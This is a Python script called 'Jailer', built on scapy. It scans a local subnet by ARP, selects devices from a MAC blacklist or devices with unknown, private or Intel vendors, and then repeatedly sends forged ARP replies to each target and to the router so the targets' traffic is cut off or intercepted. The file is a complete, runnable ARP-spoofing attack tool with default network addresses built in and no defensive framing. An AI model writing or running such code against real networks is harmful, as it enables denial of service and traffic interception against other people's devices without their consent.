import sys
from scapy.all import srp, Ether, ARP, arping, send
import csv
import re
import ipaddress
import argparse
import time
import requests
from shutil import which


class Jailer:
    all_computer = "ff:ff:ff:ff:ff:ff"

    def __init__(self, initIP, cidr, routerIP,
                 interval=300, verbose=False,
                 bunk=False):
        self.initIP = initIP
        self.cidr = cidr
        self.routerIP = routerIP
        self.interval = interval
        self.verbose = verbose
        self.blacklist = self.getBlacklist()
        self.whitelist = self.getWhiteList()
        self.bunk = bunk
        self.checkTCPDump()
        self.unknowns = list()
        self.not_unknowns = list()

    def checkTCPDump(self):
        try:
            if which("tcpdump") is None:
                raise Exception
        except Exception:
            print(f"{self.getTime()} >>> {sys.argv[0]} needs TCPDump")
            sys.exit()

    @staticmethod
    def getBlacklist():
        blacklist = list()

        with open("jail.csv", newline="") as f:
            reader = csv.reader(f)
            for row in reader:
                blacklist.append(row[0])

        return blacklist

    @staticmethod
    def getTime():
        return time.strftime("%H:%M:%S", time.localtime())

    def jail(self, router):

        start = time.time()
        ans = self.scan_network()
        time_elapsed = time.time() - start
        full_list = self.blacklist
        if self.bunk:
            self.findUnknownMAC(ans, full_list)
        self.removeWhitelisted(full_list)

        found, not_found = self.findIP(ans, full_list)
        for _ in found: print(_.get("mac"), end=" ")  # noqa:E701
        print(f"\n{self.getTime()} >>> {len(found)}/{len(full_list)} "
              f"found in {time_elapsed:.2f}s")

        timer = time.time()
        while time.time() <= timer + self.interval:
            for _ in found:
                if self.isAlive(_):
                    self.spoof(router, _, verbose=self.verbose)
                time.sleep(0.2)

            # avoid 99% cpu usage
            time.sleep(0.2)

    def execute(self):
        router = {"ip": self.routerIP, "mac": self.findMAC(self.routerIP)}
        while 1:
            try:
                self.jail(router)
                print(f"{self.getTime()} >>> rescanning...")
            except KeyboardInterrupt:
                print("======= unjailed! ========")
                sys.exit()

    def scan_network(self):
        ans, unans = srp(Ether(dst=Jailer.all_computer)/ARP(pdst=self.initIP +
                         "/"+self.cidr), timeout=2, verbose=False)

        return ans

    def findIP(self, ans, MAC):
        not_found = set(MAC)
        found = list()

        for s, r in ans:
            for _ in MAC:
                mac_temp = r[Ether].src
                if mac_temp == _:
                    not_found.discard(mac_temp)
                    found.append({"ip": r[Ether].psrc, "mac": mac_temp})

        return found, not_found

    # and intel
    def findUnknownMAC(self, ans, input_list):
        for _ in ans:
            mac_addrs = _[1].src
            vendor = ""

            if mac_addrs in self.unknowns and mac_addrs not in input_list:
                print(mac_addrs)
                input_list.append(mac_addrs)
                continue

            if mac_addrs in self.not_unknowns:
                continue

            vendor = self.findMACVendor(mac_addrs)
            is_weird_vendor = vendor == "Unknown" or vendor == "Private" or vendor[:5] == "Intel"  # noqa:E501
            if mac_addrs not in input_list and is_weird_vendor:
                input_list.append(mac_addrs)
                self.unknowns.append(mac_addrs)
            elif not is_weird_vendor:
                self.not_unknowns.append(mac_addrs)

    def findMACVendorFromAPI(self, mac):
        MAC_URL = "http://macvendors.co/api/"

        # autoclose session
        with requests.Session() as s:
            while True:
                try:
                    r = s.get(MAC_URL+mac)
                    break
                except requests.exceptions.RequestException as e:
                    print(f"{self.getTime()} >>> {e}")
                except Exception as e:
                    print(f"{self.getTime()} >>> {e}")

        response = r.json().get("result")
        vendor = response.get("company")
        # vendor is not found
        if not vendor:
            vendor = "Unknown"
        return vendor

    def findMACVendor(self, MAC):
        vendor = ""
        with open("vendor_list.csv", "r") as rf:
            reader = csv.reader(rf)
            for row in reader:
                if row[0] == MAC[:8]:
                    vendor = row[1]

        # if vendor is not found in vendor_list.csv
        if not vendor:
            vendor = self.findMACVendorFromAPI(mac=MAC)
            with open("vendor_list.csv", "a") as af:
                writer = csv.writer(af, delimiter=",")
                writer.writerow([MAC[:8], vendor])

        return vendor

    @staticmethod
    def findMAC(IP):
        ans, unans = arping(IP, verbose=False)
        for s, r in ans:
            return r[Ether].src

    @staticmethod
    def isValidMAC(mac):
        mac_regex = re.compile(r'^([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})$',
                               re.IGNORECASE)

        if mac_regex.match(mac):
            return True
        else:
            return False

    @staticmethod
    def isValidIP(IP):
        try:
            ipaddress.ip_address(IP)
            return True
        except ValueError:
            return False

    @staticmethod
    def isAlive(victim):
        ans, unans = arping(victim.get("ip"), verbose=False)
        if len(ans) and victim.get("mac") == ans[0][1][Ether].src:
            return True
        else:
            return False

    @staticmethod
    def spoof(router, victim, verbose=False):
        # router = {"ip":"", "mac":""}
        if int(time.time()) % 3 == 0 and verbose:
            print(victim.get("mac"), victim.get("ip"))
        send(ARP(op=2, pdst=victim.get("ip"), psrc=router.get("ip"),
                 hwdst=victim.get("mac")), verbose=False)
        send(ARP(op=2, pdst=router.get("ip"), psrc=victim.get("ip"),
                 hwdst=router.get("mac")), verbose=False)
        time.sleep(0.2)

    @staticmethod
    def getWhiteList():
        whiteList = list()
        with open("whitelist.csv", newline="") as f:
            reader = csv.reader(f)
            for row in reader:
                whiteList.append(row[0])

        return whiteList

    def removeWhitelisted(self, input_list):
        for item in input_list:
            if item in self.whitelist:
                input_list.remove(item)



if __name__ == "__main__":
    routerIP = "10.2.255.254"
    initIP = "10.2.1.0"
    cidr = "24"
    interval = 90

    parser = argparse.ArgumentParser()
    parser.add_argument('--interval', type=int, default=90, help="interval")
    parser.add_argument('--router', default="10.2.255.254", help="router IP")
    parser.add_argument('--init', default="10.2.1.0", help="initial IP")
    parser.add_argument('--cidr', default="24")
    parser.add_argument('-v', '--verbose', action='store_true')
    parser.add_argument('-b', '--bunk', action='store_true')
    args = parser.parse_args()

    # jail(routerIP, interval)
    j = Jailer(args.init, args.cidr, args.router,
               args.interval, verbose=args.verbose,
               bunk=args.bunk)
    j.execute()
